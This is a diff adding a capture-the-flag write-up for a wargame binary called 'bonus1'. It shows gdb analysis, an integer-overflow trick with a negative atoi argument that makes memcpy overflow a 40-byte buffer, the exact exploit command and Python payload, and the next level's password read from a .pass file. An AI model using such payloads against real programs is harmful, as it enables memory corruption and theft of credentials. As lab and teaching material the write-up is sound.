@@ -1,3 +1,31 @@
 HOW TO FIND THE FLAG:
 
+Let's analyse the binary file bonus1 with gdb. gdb bonus1 -> info functions
 
+-> use of memcpy and atoi -> we are going to use the underflow / overflow exploit.
+
+disas main -> buffer of size 40 and then int. call to atoi with argv[1] arg  and return in the int variable.
+
+if value > 9 then return 1. otherwise multiply this int by 4. Then memcpy the argv[2] with size of the integer variable (return of atoi multipied by 4) in the buf of size 40.
+
+We are going exploit this and put a value superior to 40 in order to segfault.
+
+As the return to atoi should be inferior to 9 we are going to use underflow.
+
+UINT_MIN is -4294967296. We need to a value that multiplied by 4 that will give us a number larger than 40 and that will trigger a segfault in the memcpy
+
+-4294967296 / 4 = -1073741824 -> r -1073741824 -> b *main+76 -> give us exactly 0
+
+lets try with -1073741812 -> i r -> ret atoi is equal to 48 so buffer of size 48
+
+Is it enough to segfault ? r -1073741824 $(python -c 'print "A" * 48') -> no segfault
+
+Let's try with a bigger buffer size -> r -1073741808 -> i r -> size 64
+
+r -1073741808 $(python -c 'print "A" * 64') -> segfault receive 0x41414141
+
+Perfect ! Now we need to put the value we want for the return of atoi after the buffer of 40 char 
+
+./bonus1 -1073741808 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"') or with the value of the hex in string -> ./bonus1 -1073741808 $(python -c 'print "A" * 40 + "FLOW"') ->
+
+cat /home/user/bonus2/.pass -> 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245 
